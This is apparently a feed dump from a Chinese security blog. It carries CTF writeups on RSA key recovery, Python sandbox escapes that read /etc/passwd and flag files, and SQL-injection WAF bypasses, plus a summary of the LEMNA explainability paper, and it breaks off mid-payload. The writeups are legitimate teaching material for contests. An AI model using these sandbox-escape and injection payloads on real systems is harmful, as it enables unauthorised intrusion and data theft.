class="line">phi_n、iqmp、ipmq、e、c</span><br></pre></td></tr></table></figure></p><p>首先我们看一下各个变量的定义：<br><img src="/images/2019-12-13-23-04-59.png" alt=""><br>那么现在即考虑，如何利用iqmp和ipmq推导出p和q，首先将式5、6变为等式：<br><img src="/images/2019-12-13-23-08-11.png" alt=""><br>我们将两式相乘得到：<br><img src="/images/2019-12-13-23-10-34.png" alt=""><br>那么即：<br><img src="/images/2019-12-13-23-10-48.png" alt=""><br>移项化简：<br><img src="/images/2019-12-13-23-11-33.png" alt=""><br>同时我们知道k1和k2的范围：<br><img src="/images/2019-12-13-23-14-21.png" alt=""><br>那么可以转换为这样一个问题，在极限情况k1和k2均取右边值时，会出现如下情况：<br><img src="/images/2019-12-13-23-24-35.png" alt=""><br>但显然不等式右边肯定小于2n+1，那么x的取值只能为1或2，但是如果x取2，那么除非k1取q，k2取p，否则不等式将不成立，但这显然不可能取得。所以x只能为1，那么我们得到式子：<br><img src="/images/2019-12-13-23-28-05.png" alt=""><br>那么我们将最初的式5、6相加：<br><img src="/images/2019-12-13-23-29-58.png" alt=""><br>而我们知道：<br><img src="/images/2019-12-13-23-30-49.png" alt=""><br>展开后得到：<br><img src="/images/2019-12-13-23-31-53.png" alt=""><br>那么可以得到phi_n和n的关系式如下：<br><img src="/images/2019-12-13-23-32-32.png" alt=""><br>我们将其带入等式：<br><img src="/images/2019-12-13-23-29-58.png" alt=""><br>得到：<br><img src="/images/2019-12-13-23-34-24.png" alt=""><br>那么可以联立方程组：<br><img src="/images/2019-12-13-23-35-53.png" alt=""><br>那么可以构成一组二元二次方程。为约束求解方便，我们可以利用换元法，做一下代换：<br><img src="/images/2019-12-13-23-37-19.png" alt=""><br>替换后得到：<br><img src="/images/2019-12-13-23-40-22.png" alt=""><br>那么我们将x带入消元，再将式子两边同乘y：<br><img src="/images/2019-12-13-23-43-44.png" alt=""><br>我们化简后得到：<br><img src="/images/2019-12-13-23-45-53.png" alt=""><br>如此一来，即化简成了一元二次方程组问题，那么我们可以用z3来求解：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">Y = Int(<span class="string">'Y'</span>)</span><br><span class="line">phi = <span class="number">11177929896833318778267064419554047209804133035532602158237892469506082395935495256139136112194510151728917586404919115707761109072628761295860181662822356164160284726297946695851442119129722147684494637497443200139538149832495961915450185804086755272971387407998204100589137627495400914243828434106078332327997903842841517071021248147779935078071506489655500155896938283840729728572328660647233974344849571246788826036265850539775145330135792207209473452843737567371694666658091855216070403504619639510901644370971614286091867701992201923071041178318790575030522483839410855929335515391080189720203086802888683798400</span></span><br><span class="line">iqmp = <span class="number">91015809392527255523072044687980286577671138545257803641612547883387289541035388722157767029686572001797549231630088970758132893695316792508265294751302240594796242084165161239587935396541914404832318478070695600559420277875549100164011180835754613742632525637982101603421982448705454195363628987806367263766</span></span><br><span class="line">ipmq = <span class="number">10870198964186987138989651624057552405853366954080463316431710442091837631287759912193054100505356356476481503550009625275319473929512195371174525538642232600176213853601253377888749818545192155785873323173291991086758912490744417777560275318548708479769299122462125768416235737869558154549710389717852257846</span></span><br><span class="line">solve(Y**<span class="number">2</span>*(iqmp<span class="number">-1</span>)+Y*(ipmq+iqmp-phi<span class="number">-2</span>)+ipmq*phi-phi==<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>容易计算出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y=110759942750329561983364096770824818957156636845110590823134362698749612147788955083351174879972411435569300696393151260960779092387966200431706198509584768247841937719219850118991339268977853455607397866025870712323459278215127588375709815956587698977630219989552045686550681692693762584298742938231996726336</span><br></pre></td></tr></table></figure></p><p>那么即可利用y，计算出x，即可得到p和q，然后写出解密脚本:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">Y = <span class="number">110759942750329561983364096770824818957156636845110590823134362698749612147788955083351174879972411435569300696393151260960779092387966200431706198509584768247841937719219850118991339268977853455607397866025870712323459278215127588375709815956587698977630219989552045686550681692693762584298742938231996726336</span></span><br><span class="line">p = Y+<span class="number">1</span></span><br><span class="line">phi = <span class="number">11177929896833318778267064419554047209804133035532602158237892469506082395935495256139136112194510151728917586404919115707761109072628761295860181662822356164160284726297946695851442119129722147684494637497443200139538149832495961915450185804086755272971387407998204100589137627495400914243828434106078332327997903842841517071021248147779935078071506489655500155896938283840729728572328660647233974344849571246788826036265850539775145330135792207209473452843737567371694666658091855216070403504619639510901644370971614286091867701992201923071041178318790575030522483839410855929335515391080189720203086802888683798400</span></span><br><span class="line">X = phi/Y</span><br><span class="line">q = X+<span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x3ce4e91042f61e3b03537d825e7619a02b3f729a91e2de4fb724b95cabe8fb2a7a92c4270025d93aed94f1726ca761083328a7784806e1467f0bc204ef95484ce6b0d207574c6dba4fa91664db4c787e3df517bcfc370a0c5eed8a70b45be8d1e757a9d40eb410e66d2110ac9ece435f76d71e134e2bdbe565e8853e1100ae276211c2b9c49219bca8805ff697dcf84be00b071c3be01f35ba9a4ea1d8ef2c69044982a7fc021d2f6f93b8755948a606a8a376e74d995f439aeeb844ecf678a189916adca406197a1d2eaf2abe84ae6e794560537bcde43a1504f135874d5de9e0a2d95093e4ba7a87641e769e46a911c94ff60525b21c9c709068a89808b6bf</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure></p><h2 id="被嫌弃的python的一生"><a href="#被嫌弃的python的一生" class="headerlink" title="被嫌弃的python的一生"></a>被嫌弃的python的一生</h2><p>该系列有3道题，都是python继承链考察，难度也逐渐递进。</p><h3 id="上"><a href="#上" class="headerlink" title="上"></a>上</h3><p>在看python继承链时，我们得先了解一下内置方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">instance.__class__</span><br><span class="line">The class to which a class instance belongs.</span><br></pre></td></tr></table></figure></p><p>比如:<br><img src="/images/2019-12-14-11-33-28.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.__bases__</span><br><span class="line">The tuple of base classes of a class object.</span><br></pre></td></tr></table></figure></p><p>比如：<br><img src="/images/2019-12-14-11-35-46.png" alt=""><br>此处basestring是 str 和 unicode 的超类（父类），也是抽象类。<br><img src="/images/2019-12-14-11-36-33.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.__subclasses__()</span><br><span class="line">Each new-style class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive.</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-14-11-38-43.png" alt=""><br><strong>subclasses</strong>可以列举一个类的子类，此时我们能看到刚才出现的basestring和int。<br>所以简单总结一下：<br><strong>class</strong>：查看属于哪个类<br><strong>base</strong>：查看该类的父类<br><strong>subclasses</strong>：列举该类的子类<br>那么当我们想要使用继承链攻击时，我们先使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>再利用<strong>base</strong>上跳到object:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>然后再列举object下的子类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print [].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure></p><p>再寻找其中是否含有危险类，例如file任意读文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__.__base__.__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>那么利用写出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print [].__class__.__base__.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure></p><p>题目中由于flag被过滤，那么使用拼接bypass:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__.__base__.__subclasses__()[40](&apos;fl&apos;+&apos;ag&apos;).read()</span><br><span class="line">fductf&#123;python_is_the_best_language&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-13-23-47-26.png" alt=""></p><h3 id="中"><a href="#中" class="headerlink" title="中"></a>中</h3><p>我们查看源码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_type</span><span class="params">()</span>:</span></span><br><span class="line">    type_dict = get_dict(type)</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__bases__'</span>]</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__subclasses__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_func_code</span><span class="params">()</span>:</span></span><br><span class="line">    func_dict = get_dict(FunctionType)</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">'func_code'</span>]</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">'__closure__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">builtins_clear</span><span class="params">()</span>:</span></span><br><span class="line">    blackList = [<span class="string">'open'</span>,</span><br><span class="line">                 <span class="string">'file'</span>,</span><br><span class="line">                 <span class="string">'eval'</span>,</span><br><span class="line">                 <span class="string">'execfile'</span>,</span><br><span class="line">                 <span class="string">'compile'</span>,</span><br><span class="line">                 <span class="string">'__import__'</span>,</span><br><span class="line">                 <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> __builtins__.__dict__.keys():</span><br><span class="line">        <span class="keyword">if</span> mod <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">del</span> __builtins__.__dict__[mod]</span><br></pre></td></tr></table></figure></p><p>我们看到题目删除了<strong>import</strong>函数，那么我们将无法导入任何python模块，同时题目删除了<strong>subclasses</strong>，那么我们在使用继承链中调用子类将变得非常困难。<br>但是我们不难发现，我们依然可以使用reload函数。而reload函数用于重新载入之前载入的模块。<br>那么我们可以借助reload，来重新载入<strong>builtins</strong>，那么其删除的函数将会恢复：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)</span><br></pre></td></tr></table></figure></p><p>我们做个实验，首先删除<strong>import</strong>方法：<br><img src="/images/2019-12-14-11-19-31.png" alt=""><br>可以发现，我们在调用import的时候，已经无法正常使用，此时我们重新载入<strong>builtins</strong>：<br><img src="/images/2019-12-14-11-20-31.png" alt=""><br>发现已可以正常使用import：<br><img src="/images/2019-12-13-23-47-58.png" alt=""><br>那么即刻获取flag。</p><h3 id="下"><a href="#下" class="headerlink" title="下"></a>下</h3><p>我们查看源码，发现题目还给我们留下了stderr：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    stderr.write(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">    inp = raw_input()</span><br><span class="line">    cmd = input_filter(inp)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">exec</span> cmd</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        stderr.write(<span class="string">"An error has occurred!\n"</span>)</span><br></pre></td></tr></table></figure></p><p>那么我们还能用stderr.write进行指定内容输出：<br><img src="/images/2019-12-13-23-49-12.png" alt=""><br>那么研究一下stderr：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print help(sys.stderr)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-14-12-01-40.png" alt=""><br>我们stderr是类file下的，那么我们可以利用<strong>class</strong>创造出file：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print sys.stderr.__class__</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>然后即可进行任意文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.stderr.__class__(&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure></p><p>然后利用stderr.write将内容带出，写出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stderr.write(stderr.__class__(&apos;flag&apos;,&apos;r&apos;).read())</span><br></pre></td></tr></table></figure></p><p>得到flag：<br><img src="/images/2019-12-13-23-48-22.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目还是比较容易的，主要面向新人以及拓宽知识面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近学校有招新赛，难度比较低。于是节选了几道稍微有点意思的题目记录一下。&lt;/p&gt;
&lt;h2 id=&quot;你再注试试&quot;&gt;&lt;a href=&quot;#你再注试
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; LEMNA &amp; Explaining Deep Learning based Security Applications</title>
    <link href="http://skysec.top/2019/12/07/Paper-Summary-LEMNA-Explaining-Deep-Learning-based-Security-Applications/"/>
    <id>http://skysec.top/2019/12/07/Paper-Summary-LEMNA-Explaining-Deep-Learning-based-Security-Applications/</id>
    <published>2019-12-07T07:45:50.000Z</published>
    <updated>2019-12-24T12:36:39.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次带来的是一篇2018 CCS Best Paper，主要阐述的是作者实现了一种解释深度学习决策原因的方法：LEMNA。这一方法明显弥补了在安全领域解释方法的稀缺和低保真率的问题。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>众所周知，深度学习在图片分类上有着比较显著的核心地位，比如：<br><img src="/images/2019-12-07-15-52-34.png" alt=""><br>当我们input一张图片给计算机后，计算机可以根据这张图片，输出描述该图像属于某一特定分类的概率的数字（比如：80% 是机器人、15% 是人、5% 是电视机）。<br>而这一目的的实现，目前一般采用的是CNN（卷积神经网络）。<br>但是，如果我们需要将相同的目的，转换至安全领域呢？比如恶意软件的分类：我们input一个文件给计算机，计算机是否可以根据这个文件的信息，输出该文件属于某一特定分类的概率的数字呢？比如80%是正常软件、20%是恶意软件。<br>答案是显然的，但这里我们一般采用的是RNN（循环神经网络）。<br>那么CNN和RNN有什么区别呢？<br>我们可以这样简单理解，对于CNN：</p><ul><li>CNN的假设：人类的视觉总是会关注视线内特征最明显的点。</li><li>CNN神经网络是模仿人类处理信息的过程，提取关键信息特点<br>而对于RNN：</li><li>RNN的假设：事物的发展是按照时间序列展开的，即前一刻发生的事物会对未来的事情的发展产生影响</li><li>处理过程中，每一刻的输出都是带着之前输出值加权之后的结果</li></ul><p><img src="/images/2019-12-07-15-57-35.png" alt=""><br>那么为什么对于安全领域，我们偏向于使用RNN也一目了然，很显然程序前后之间是存在关联的，前一段代码势必会对未来执行的代码产生影响，而RNN很好的能将这一点表述出来。<br>那么决策的解释方法又是什么呢？<br>举个简单的例子，对于CNN，我们刚才说到，对于我们input的机器人图片，计算机会给出这样的分类概率：80% 是机器人、15% 是人、5% 是电视机。这样的结果和我们所期望的大致一致。但是如果计算机给出的分类概率为：99%是电视机，那么就会出现分类错误。<br>那么是什么原因导致我们的深度学习分类决策失误呢？这里就需要使用解释方法来进行分析，找到错误，并纠正错误。<br>举个简单的例子：<br><img src="/images/2019-12-07-16-45-17.png" alt=""><br>比如图片a中，为什么会把图a左边这张图判定为橘子，是因为图a右边高亮的像素点。<br>又比如图片b中，为什么会把这一段话判定为消极语句，是因为图b中红框高亮的一段话。<br>只有拥有比较完善的解释方法，我们才可以充分信任分类器做出的决策，否则如果其决策对我们不透明，那么其分类结果也将变得不可信。<br>而对于解释方法，我们可以大概分为两类，一种为白盒模式，一种为黑盒模式。<br>对于白盒模式，我们需要提供模型架构、参数、训练数据集，而对于黑盒模式，我们需要不断改变input，观察output，并得出影响决策的关键原因。<br>那么很明显，白盒模式更加适用于CNN模式，同时大多数工具也是基于白盒模式，开发给CNN使用的。而黑盒模式更加适用于安全领域。</p><h2 id="研究问题"><a href="#研究问题" class="headerlink" title="研究问题"></a>研究问题</h2><p>本篇paper的研究问题，就在于如何解释深度学习在安全领域上分类决策的原因。深度学习在安全领域也逐渐开始有比较广的应用，但是目前没有一个很好的解释方法可以解释其决策的原因，就会使得我们丢失对分类器的信任。<br>由于CNN在图片分析上的广泛使用，现有的大多数解释方法全都是供CNN使用。但我们前面提到过，在安全领域，RNN才是更适合的方法。<br>我们不可能将为CNN设计的解释方法，用于RNN上，这样势必只能获得比较低可信度的结果。<br>作者首先分析了一下现有的几款解释方法：<br><img src="/images/2019-12-07-16-07-24.png" alt=""><br>不难发现，对于黑盒解释方法，只有LIME有所涉及，但是其对RNN / MLP的支持并不是非常好，同时其采用的是线性回归模型。<br>那么什么是线性回归模型呢？<br><img src="/images/2019-12-07-16-08-51.png" alt=""><br>比如这样一只猫的图片，影响该图片被分类为猫的因素肯定有很多，通常可考虑如下的线性关系式：<br><img src="/images/2019-12-07-16-10-12.png" alt=""><br>在改变x的时候，我们可以大约探测出图中函数f的边界，这样就可以帮助我们得知，改变哪些x的时候，会对分类产生关键的影响。而其对应的特征，就是影响决策的关键特征。<br>但是作者发现，这样的方式，在对于复杂模型的时候，并不适用，存在比较大的误差：<br><img src="/images/2019-12-07-16-13-49.png" alt=""><br><img src="/images/2019-12-07-16-15-03.png" alt=""><br>我们在用该方式处理复杂问题时，它会将每一个特征视为独立的，但我们知道这些特征势必是有相互关联性的，比如一只猫不可能只有耳朵，没有脸。<br><img src="/images/2019-12-07-16-15-14.png" alt=""><br>其最佳的方法不应该选用线性回归模型，还应该使用混合回归模型：<br><img src="/images/2019-12-07-16-15-44.png" alt=""><br>简而言之，就是由多个线性回归模型组成的模型，这样才能更好的探测出函数f的边界。<br>所以为了解决线性回归模型的弊端问题，作者尝试引入了混合回归模型。而为了解决特征之间的相互依赖关系，作者使用了fused lasso(惩罚最小一乘回归)。如此一来，将混合回归模型和惩罚最小一乘回归二者结合，即可比较完美的解决LIME的弊端问题。</p><h2 id="现实评估"><a href="#现实评估" class="headerlink" title="现实评估"></a>现实评估</h2><p>作者使用了混合回归模型和惩罚最小一乘回归二者结合的解释方法，主要分析了如下两种情况：<br>1、解释逆向工程中查找函数开头的决策原因：即为什么把这个位置标记为函数开头。<br><img src="/images/2019-12-07-16-24-27.png" alt=""><br>例如在图片中，我们将这种图判定为猫的主要原因，是因为右边高亮的像素点，这是解释器需要给出的原因。<br>而在二进制文件分析中也一样：<br><img src="/images/2019-12-07-16-25-06.png" alt=""><br><img src="/images/2019-12-07-16-26-18.png" alt=""><br>我们为什么把83认定为函数开头位置，是因为其前面90的位置。这也是解释器需要给出的原因。<br>2、解释PDF恶意文件分类的决策原因：即为什么把这个PDF判定为正常文件/恶意文件。<br>作者设置了如下数据集：<br>对于逆向工程，作者使用了2200个binary文件，在x86下利用gcc的4种不同优化模式（O0, O1, O2, O3）进行编译。<br>然后将数据集中70%用于训练，30%用户测试。<br>对于PDF文件，作者使用了4999个恶意文件和5000个正常文件，并从中提取了135个特征点。并将其也按照7：3分为训练集和测试集。<br>在结果上，我们可以发现拥有相当高的准确度：<br><img src="/images/2019-12-07-16-29-52.png" alt=""><br>除此之外，作者还对自己的LEMNA的解释保真度进行了评估，即决策的重要原因找的对不对。<br>为此作者设计了两大组实验：<br>第一组实验，作者使用了公式进行评估，即均方根误差（Root Mean Square Error）：<br><img src="/images/2019-12-07-16-31-48.png" alt=""><br>pi表示目标分类器分类为target的概率、pi-hat表示使用混合回归模型分类为target的概率。<br>那么RMSE越小，说明决策边界找的和目标分类器越一致。<br>作者使用LIME作为参照体：<br><img src="/images/2019-12-07-16-32-55.png" alt=""><br>我们可以发现，作者提出的LEMNA的边界寻找准确度比前人工作LIME在逆向工程上高出了将近10倍，在PDF恶意文件分类上高出了5倍。这也充分证实了混合线性模型对比线性模式的优势。<br>第二组实验，作者使用了如下3个小实验：<br><img src="/images/2019-12-07-16-34-46.png" alt=""><br>比如用图片举例，我们input进去一张图片(a)，解释器告诉我们将这张图片分类为毛衣，而不是鞋子的关键原因：图片（b)（关键像素已由红点高亮）<br>那么我们的3组实验分别为：<br>图片c：我们将解释器得出的关键像素去除，再丢入分类器，如果分类器将其判定为非毛衣的可能性与我们去除关键像素的个数成反比，那么说明解释器解释的越正确。<br>图片d：我们仅留下关键像素，同时加入一双鞋子做干扰，如果分类器将其判定为毛衣的可能性与我们加入关键像素的个数呈正比，那么说明解释器解释的越正确。<br>图片e：在图片d的基础上去除干扰，在我们加入关键像素点越少的情况下，如果分类器已经可以很高概率将其判定为毛衣，那么我们的解释器解释的越正确。<br>结果也证实了，作者的工具拥有最高的效率（图中红线为作者工具）：<br><img src="/images/2019-12-07-16-39-39.png" alt=""><br>对于图片c模式的测试下，作者在仅去除5个关键点后，分类器的分类成功率就已经在一个非常低的水准了，而其他前人的方法还在一个比较高的成功率，这充分说明了，作者的解释方法找到的关键因素才为保真度非常高的关键因素。<br><img src="/images/2019-12-07-16-41-21.png" alt=""><br><img src="/images/2019-12-07-16-41-26.png" alt=""><br>同理，对于图片d和图片e模式下的测试，作者在仅用5个关键特征的情况下，就已经让分类器达到了比较高的准确率，这也同样说明了作者的工具解释出的关键特征，具有更高的保真度。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得来说，本篇paper在安全领域的深度学习决策解释上填补了空缺，同时其解释的关键原因具有非常高的可信度，效果也是远好于前人设计的解释方法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本次带来的是一篇2018 CCS Best Paper，主要阐述的是作者实现了一种解释深度学习决策原因的方法：LEMNA。这一方法明显弥补了
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 SWPU CTF Web Writeup</title>
    <link href="http://skysec.top/2019/12/06/2019-SWPU-CTF-Web-Writeup/"/>
    <id>http://skysec.top/2019/12/06/2019-SWPU-CTF-Web-Writeup/</id>
    <published>2019-12-06T14:02:09.000Z</published>
    <updated>2019-12-07T02:49:26.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>12月比赛有点少，手有点生了，发现SWPU又开始了，还记得去年质量挺高的，于是来玩玩，下面是web的解题记录。</p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>随便注册一个用户进入，发现有广告发送的地方，随手测试：<br><img src="/images/2019-12-06-10-02-12.png" alt=""><br>点入发现触发了sql报错：<br><img src="/images/2019-12-06-10-02-05.png" alt=""><br>随手又试了一下：<br><img src="/images/2019-12-06-10-02-19.png" alt=""><br>发现确实可以闭合：<br><img src="/images/2019-12-06-10-02-26.png" alt=""><br>首先尝试联合查询注入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp：</span><br><span class="line">0&apos; union select  1,2,3,&apos;a&apos;=&apos;a</span><br><span class="line"></span><br><span class="line">waf:</span><br><span class="line">0&apos;unionselect1,2,3,&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p>发现空格会被替换成空，于是尝试用如下方式bypass:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;/**/union/**/select/**/1,2,3,&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p>但发现列数过多，随机放弃这个方法，选择报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-45-46.png" alt=""><br>测试过程中发现，or被过滤，我们无法获取表名和列名，那么首先查看一下mysql版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/version()),0x7e))/**/||&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-46-42.png" alt=""><br>发现版本很高，思考mysql新特性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select/**/table_name/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()</span><br></pre></td></tr></table></figure></p><p>但发现mysql被过滤，继续查找新特性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-50-22.png" alt=""><br>爆表：<br><img src="/images/2019-12-06-12-52-18.png" alt=""><br>尝试爆表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=&apos;web1&apos;),0x7e))/**/&amp;&amp;&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-58-21.png" alt=""><br>发现成功获取表名，但是无法爆列名，但是可以使用无列名注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select i.1 from (select 1,2,3 union select * from flag)i</span><br></pre></td></tr></table></figure></p><p>即可无需列名注入指定列数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.2/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-13-03-40.png" alt=""><br>发现第二列是flag，那么注第3列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 